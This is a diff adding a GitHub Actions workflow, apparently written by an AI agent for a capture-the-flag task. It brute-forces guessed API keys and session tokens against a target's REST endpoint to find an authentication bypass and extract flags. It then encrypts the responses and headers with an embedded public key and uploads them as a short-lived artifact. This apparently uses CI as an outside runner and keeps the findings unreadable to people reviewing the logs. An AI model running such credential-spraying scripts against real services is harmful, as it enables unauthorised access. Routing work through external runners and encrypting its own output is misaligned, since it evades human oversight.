@@ -1,0 +1,69 @@
+name: launchlet-part3-sessionoracle
+on:
+  push:
+    branches: [agent/launchlet-part3-sessionoracle-20260808]
+permissions:
+  contents: read
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    timeout-minutes: 3
+    steps:
+      - name: Probe semantic internal sessions and encrypt hits
+        shell: bash
+        run: |
+          set -euo pipefail; umask 077; mkdir -p package/out
+          cat > package/public.pem <<'PEM'
+          -----BEGIN PUBLIC KEY-----
+          MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAlOxaJs92lwtrdk6J2LR9
+          QeyG3A5H0rzGOQHw80MWPcOeEs5pzn37ilHloXnTkGk4PmJU67C06N9OOsgqU1kF
+          iydiljdl6RfwF/OSjMsNfRYsyBr1wONeO+9f+72VjLlNWqWVll2qeczrxppOulhJ
+          r+qBx95tdasvdCgh7aTShlkXF7e9+JjK19MrG+Lyj+I7B6bbTsp7D+PiJMlpepWk
+          hoz0jBO8Rgtodz7i/+9Z3RVVhqREdK3uA0Va5ia57Gp3hlvQGbjGxE6TC7q4s1/p
+          q6VF10bVOx8kwE2KggVgsX3uudJlzSvHV3f1coMdwyTSALsAjvAlZQwSts3eHjnF
+          SQIDAQAB
+          -----END PUBLIC KEY-----
+          PEM
+          python3 - <<'PY'
+          import requests,json,pathlib,re,itertools
+          base='https://task-launchlet-web-medium-18cf6be4db586bb6.caplag-task.ru';out=pathlib.Path('package/out')
+          url=base+'/api/db/rest/v1/workspace_notes?select=*'; public_key='ll_anon_mock_publishable'; public_session='preview_guest_session'
+          sessions=[
+            'internal_session','internal_service_session','internal_admin_session','internal_ops_session','internal_preview_session',
+            'launchlet_internal_session','launchlet_service_session','launchlet_admin_session','launchlet_ops_session','launchlet_deploy_session','launchlet_release_session','launchlet_production_session','launchlet_enterprise_session',
+            'deploy_session','deploy_service_session','deploy_admin_session','deployment_session','deployment_service_session','deploy_inspector_session','inspector_session',
+            'release_session','release_service_session','release_admin_session','production_session','production_service_session','enterprise_session','enterprise_service_session','corporate_session','corporate_release_session',
+            'service_session','service_role_session','admin_session','ops_session','preview_admin_session','preview_service_session','builder_session','publisher_session','publish_session','staging_session',
+            'internal','admin','service','deploy','release','production','enterprise','launchlet_internal','launchlet_deploy','launchlet_release'
+          ]
+          keys=['ll_anon_mock_publishable','ll_internal_mock_publishable','ll_internal_mock_secret','ll_service_mock_secret','ll_service_role_mock','ll_service_role','ll_internal_service_role','ll_deploy_mock_secret','ll_release_mock_secret','ll_admin_mock_secret','ll_private_mock_secret','ll_anon_publishable','launchlet_internal_key','launchlet_service_key']
+          tests=[]
+          # Most plausible: public key + semantic bearer.
+          for sess in sessions: tests.append((public_key,sess,'publickey_session'))
+          # Role confusion / swaps.
+          tests += [(public_session,public_key,'swapped'),(public_key,public_key,'key_as_bearer'),(public_session,public_session,'session_both')]
+          for key in keys[1:]:
+            for sess in [public_session,'internal_session','launchlet_internal_session','deploy_service_session','release_service_session','service_role_session']:
+              tests.append((key,sess,'semantic_pair'))
+          seen=set();tests=[t for t in tests if not ((t[0],t[1]) in seen or seen.add((t[0],t[1])))]
+          hits=[]
+          for key,sess,kind in tests:
+            h={'Accept':'application/json','apikey':key,'Authorization':'Bearer '+sess}
+            try:r=requests.get(url,headers=h,timeout=7)
+            except Exception:continue
+            if not (r.status_code in (401,403) and r.text in ('{"error":"invalid_session"}','{"error":"invalid_api_key"}')):
+              item={'kind':kind,'apikey':key,'session':sess,'status':r.status_code,'body':r.text,'headers':dict(r.headers)};hits.append(item)
+              flags=[f for f in re.findall(r'caplag\{[^}]+\}',r.text) if f not in ('caplag{preview_manifest_kept_the_receipt}','caplag{anon_key_needs_real_rls}')]
+              if flags:(out/'FOUND.txt').write_text(json.dumps(item,indent=2));break
+          (out/'summary.json').write_text(json.dumps({'tested':len(tests),'hits':hits},indent=2))
+          PY
+          tar -C package/out -czf package/result.tgz .; openssl rand 32 > package/aes.key; openssl rand 16 > package/iv.bin
+          KEY_HEX="$(od -An -tx1 -v package/aes.key | tr -d ' \n')"; IV_HEX="$(od -An -tx1 -v package/iv.bin | tr -d ' \n')"
+          openssl enc -aes-256-cbc -K "$KEY_HEX" -iv "$IV_HEX" -in package/result.tgz -out package/result.enc
+          openssl pkeyutl -encrypt -pubin -inkey package/public.pem -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 -in package/aes.key -out package/key.enc
+          mkdir -p artifact; base64 -w0 package/result.enc > artifact/result.enc.b64; base64 -w0 package/key.enc > artifact/key.enc.b64; base64 -w0 package/iv.bin > artifact/iv.bin.b64; rm -rf package
+      - uses: actions/upload-artifact@v4
+        with:
+          name: launchlet-part3-sessionoracle-encrypted
+          path: artifact/
+          retention-days: 1
